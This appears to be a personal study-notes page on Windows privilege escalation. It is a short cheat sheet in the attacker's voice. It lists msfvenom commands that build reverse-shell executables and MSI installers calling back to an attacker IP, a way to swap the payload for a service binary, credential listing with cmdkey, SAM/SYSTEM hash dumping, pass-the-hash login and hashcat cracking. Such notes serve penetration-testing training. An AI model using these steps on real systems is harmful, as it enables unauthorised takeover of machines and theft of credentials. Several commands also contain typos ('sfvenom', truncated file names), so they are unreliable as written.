---
layout: post
title: 'Notes | Windows Privilage Escalation'
permalink: /notes/system/windows-privilage-escalation/
---

# [](#header-4)Insecure Windows Service Permissions
If we manage to find one Insecure Windows Service we can modify the executable file with one corrupted and wait to the service to execute (or by ourselves with *net start [service]*).
We can create a reverse shell with **msfvenom**:
{% highlight plain %}
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attackerIP] LPORT=[port] -f exe -o reverse.exe
{% endhighlight %}
And change the **reverse.exe** name with the service.exe name.

# [](#header-4)Saved Credentials
We can execute:
{% highlight plain %}
> cmdkey /list
{% endhighlight %}
to get some credentials.

# [](#header-4)SAM and SYSTEM
We can search for those files in ** C:\Windows\Repair**. With those we can get and crack the system's passwords.
For example with **creddump7**:
{% highlight plain %}
> python3 creddump7/pwdump.py SYSTEM SAM
{% endhighlight %}

Then we can log in with the hash or break the hash:
{% highlight plain %}
> pth-winexe -U 'admin%hash' //[ip] cmd.exe
{% endhighlight %}
{% highlight plain %}
> hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.tx
{% endhighlight %}

# [](#header-4)AlwaysInstalledElevated
If that property is set 1 (we can check it with: **reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevate**) we can create a msi with **msfvenom**:
{% highlight plain %}
> sfvenom -p windows/x64/shell_reverse_tcp LHOST=[ip] LPORT=[port] -f msi -o reverse.ms
{% endhighlight %}

# [](#header-4)Tools
- [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)